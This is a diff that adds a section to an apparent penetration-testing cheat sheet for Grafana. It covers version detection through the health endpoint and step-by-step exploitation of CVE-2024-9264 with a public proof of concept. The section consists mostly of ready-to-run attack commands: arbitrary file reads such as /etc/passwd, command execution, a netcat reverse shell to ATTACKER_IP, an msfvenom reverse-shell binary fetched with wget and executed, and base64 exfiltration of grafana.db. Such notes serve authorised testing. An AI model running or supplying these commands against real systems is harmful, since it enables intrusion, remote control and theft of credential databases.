@@ -25,6 +25,79 @@ curl http://TARGET:3000/robots.txt
 
 ---
 
+## Version Detection via API
+
+```bash
+# Health endpoint reveals version
+curl http://TARGET:3000/api/health
+
+# Response:
+{
+  "commit": "83b9528bce85cf9371320f6d6e450916156da3f6",
+  "database": "ok",
+  "version": "11.0.0"
+}
+```
+
+---
+
+## CVE-2024-9264 - DuckDB SQL Injection (Authenticated RCE)
+
+SQL injection in Grafana's DuckDB integration allowing authenticated users to read arbitrary files and execute commands.
+
+**Affected Versions:** Grafana v11.0.0 (code execution), v11.0.x - v11.2.1 (file read)
+
+**Requirements:** Valid Grafana credentials
+
+**Reference:** https://github.com/nollium/CVE-2024-9264
+
+### Exploitation
+
+```bash
+git clone https://github.com/nollium/CVE-2024-9264
+cd CVE-2024-9264
+
+# Read arbitrary files
+python3 CVE-2024-9264.py -u admin -p PASSWORD -f /etc/passwd http://TARGET:3000
+
+# Execute commands (v11.0.0 only)
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "id" http://TARGET:3000
+
+# Get reverse shell (if nc available)
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 9001 >/tmp/f" http://TARGET:3000
+```
+
+### Getting Shell Without nc
+
+If target lacks netcat, use msfvenom:
+
+```bash
+# Generate payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9002 -f elf -o shell.elf
+
+# Start handler
+msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost ATTACKER_IP; set lport 9002; run -j"
+
+# Download and execute via CVE
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf" http://TARGET:3000
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "chmod +x /tmp/shell.elf" http://TARGET:3000
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "/tmp/shell.elf" http://TARGET:3000
+```
+
+### Exfiltrating grafana.db via Base64
+
+```bash
+# Encode and exfiltrate database
+python3 CVE-2024-9264.py -u admin -p PASSWORD -c "cat /var/lib/grafana/grafana.db | base64" http://TARGET:3000 > grafana_b64.txt
+
+# Decode locally
+cat grafana_b64.txt | base64 -d > grafana.db
+file grafana.db
+# grafana.db: SQLite 3.x database
+```
+
+---
+
 ## CVE-2021-43798 - Arbitrary File Read / LFI
 
 Directory traversal vulnerability allowing unauthenticated arbitrary file read via plugin paths.
